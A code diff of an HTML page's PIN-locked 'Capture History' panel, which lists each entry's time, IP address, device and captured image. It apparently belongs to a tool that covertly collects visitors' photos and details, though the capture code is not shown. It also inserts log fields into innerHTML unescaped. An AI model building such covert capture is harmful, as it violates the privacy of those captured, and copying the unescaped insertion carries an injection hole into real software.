@@ -22,13 +22,19 @@
   <div class="mt-10 text-center">
     <h2 class="text-2xl font-semibold mb-4">Enter Owner PIN</h2>
     <input id="ownerPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
-    <button onclick="checkOwner()" class="bg-green-500 px-4 py-2 ml-2 rounded hover:bg-green-600">Unlock</button>
+    <button onclick="checkOwner()" class="bg-blue-500 px-4 py-2 ml-2 rounded hover:bg-blue-600">Unlock</button>
   </div>
 
-  <!-- Logs -->
-  <div id="logs" class="hidden mt-10 w-3/4 max-w-lg">
-    <h2 class="text-xl font-bold mb-4">📂 Capture History</h2>
-    <div id="logContainer"></div>
+  <!-- Capture History -->
+  <div id="logs" class="hidden mt-6 w-11/12 max-w-2xl">
+    <h3 class="text-xl font-bold mb-4">📂 Capture History</h3>
+    <div id="logContainer" class="space-y-3"></div>
+
+    <!-- Clear Button -->
+    <button onclick="clearLogs()" 
+      class="mt-4 bg-red-600 hover:bg-red-700 px-4 py-2 rounded shadow">
+      🗑️ Clear History
+    </button>
   </div>
 
 <script>
@@ -49,29 +55,35 @@ function checkOwner() {
 }
 
 function loadLogs() {
-  fetch("/get-captures")
-    .then(res => res.json())
-    .then(logs => {
-      const container = document.getElementById("logContainer");
-      container.innerHTML = "";
+  const container = document.getElementById("logContainer");
+  container.innerHTML = "";
 
-      if (logs.length === 0) {
-        container.innerHTML = "<p>No captures yet.</p>";
-        return;
-      }
+  const logs = JSON.parse(localStorage.getItem("captures") || "[]");
 
-      logs.forEach(log => {
-        const div = document.createElement("div");
-        div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
-        div.innerHTML = `
-          🕒 ${log.time} <br>
-          🌍 IP: ${log.ip} <br>
-          📱 Device: ${log.device} <br>
-          <img src="${log.img}" width="200" class="mt-2 rounded">
-        `;
-        container.appendChild(div);
-      });
-    });
+  if (logs.length === 0) {
+    container.innerHTML = "<p>No captures yet.</p>";
+    return;
+  }
+
+  logs.forEach(log => {
+    const div = document.createElement("div");
+    div.className = "bg-gray-800 p-3 rounded shadow";
+    div.innerHTML = `
+      ⏰ ${log.time} <br>
+      🌍 IP: ${log.ip} <br>
+      📱 Device: ${log.device} <br>
+      <img src="${log.img}" width="150" class="mt-2 rounded">
+    `;
+    container.appendChild(div);
+  });
+}
+
+// 🗑️ Clear all logs
+function clearLogs() {
+  if (confirm("⚠️ Are you sure you want to clear all history?")) {
+    localStorage.removeItem("captures");
+    loadLogs();
+  }
 }
 </script>
 </body>
